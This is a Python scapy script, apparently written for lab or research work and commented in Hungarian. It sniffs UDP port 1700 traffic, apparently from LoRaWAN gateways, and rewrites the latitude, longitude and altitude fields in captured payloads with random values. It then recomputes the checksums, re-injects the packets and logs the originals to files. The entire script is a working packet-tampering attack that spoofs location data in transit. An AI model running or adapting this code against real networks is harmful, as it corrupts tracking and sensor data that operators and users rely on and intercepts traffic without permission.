from scapy.all import *
import binascii
import random
from datetime import datetime


def save_packets(packet: bytes, file: str):
    """
    Eljárás, mely fájlba írja a neki átadott csomagokat.

    Bemenet:
        packet: az elküldött csomag
        file: a file elérési útja, ahova mentsen
    """
    with open(file, 'ab') as w:
        w.write(packet)


def packet_callback(packet):
    """
    Eljárás, mely minden alkalommal meghívásra kerül, ha a scapy sniff függvénye
    elkap egy csomagot.

    Bemenet:
        packet: a scapy sniff függvényével elkapott csomag
    """

    # kimenti az eredeti payloadot
    mypayload = bytes(packet[UDP].payload)

    # amennyiben van benne koordináta, azt módosítja
    if b'"lati"' in mypayload:
        new_payload = change_coordinates(mypayload)
    # ha nincs, akkor nem piszkálja
    else:
        new_payload = mypayload

    # az új payload továbbküldése
    modify_and_forward(packet, new_payload)
    
    # külön a teljes packet, és csak a payload fájlba írása későbbi elemzésre
    today = datetime.today().strftime("%Y%m%d")
    save_packets(bytes(packet), f"packets_{today}.txt")
    save_packets(bytes(packet[UDP].payload), f"payloads_{today}.txt")

def change_coordinates(payload: bytes):
    """
    Függvény, mely módosítja az elkapott csomagokat a random generált koordinátákkal.

    Bemenet:
        payload: az UDP csomag payloadja

    Visszatérési érték:
        new_payload: a módosított UDP payload az új koordinátákkal és tengerszint feletti magassággal
    """

    # a cserére szánt byte-ok kinyerése
    latitude = get_changeable_bytes(payload, b'"lati"')
    longitude = get_changeable_bytes(payload, b'"long"')
    altitude = get_changeable_bytes(payload, b'"alti"')
    
    # random koordináták generálása
    new_lati, new_long, new_alti = generate_coordinates()
    
    # megfelelő byte-ok cseréje
    new_payload = payload.replace(latitude, new_lati.encode())
    new_payload = new_payload.replace(longitude, new_long.encode())
    new_payload = new_payload.replace(altitude, new_alti.encode())
    print(f'Original: {payload}')
    print(f'New: {new_payload}')
    return new_payload


def get_changeable_bytes(payload: bytes, start_byte: bytes):
    """
    Függvény, mely megkeresi a payloadban a módosítani kívánt byte-okat.

    Bemenet:
        payload: az UDP payload
        start_byte: az a string byte formában, ahonnan kezdődik a keresett szöveg a cseréhez

    Visszatérési érték:
        result: a payload cserére szánt része byte formában
    """
    start_index = payload.find(start_byte)
    stop_index = payload[start_index:].find(b',') + start_index
    result = payload[start_index:stop_index]
    return result


def generate_coordinates():
    """
    Függvény, mely random generál földrajzi koordinátákat és tengerszint feletti magasságot.

    Visszatérési érték:
        (lat, long, alti): 3 elemű tuple, melyben a random koordináták és tengerszint feletti magasság van string formában
    """
    lat = f'"lati":{round(random.randint(1000,90000) * 0.001, 4)}'
    long = f'"long":{round(random.randint(1000,180000) * 0.001, 4)}'
    alti = f'"alti":{random.randint(10,10000)}'
    return (lat, long, alti)

def modify_and_forward(packet, payload: bytes):
    """
    Eljárás, mely a módosított packet-et továbbküldi.
    
    Bemenet:
        packet: az eredeti csomag
        payload: a már módosított csomag
    """
    if packet.haslayer(UDP):
        # Az eredeti payload cseréje a packetben a módosítottra
        packet[Raw].load = payload

        # checksumok újraszámolása
        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum
    try:
        # módosított csomag továbbküldése
        sendp(packet, verbose=False)
    except:
        pass

print("[*] Start")
# a scapy sniff() függvénye "hallgatózik", és kapja el a szűrésnek megfelelő
# csomagokat, és "kapás" esetén hívja a packet_callback eljárást
sniff(filter="udp port 1700", prn=packet_callback)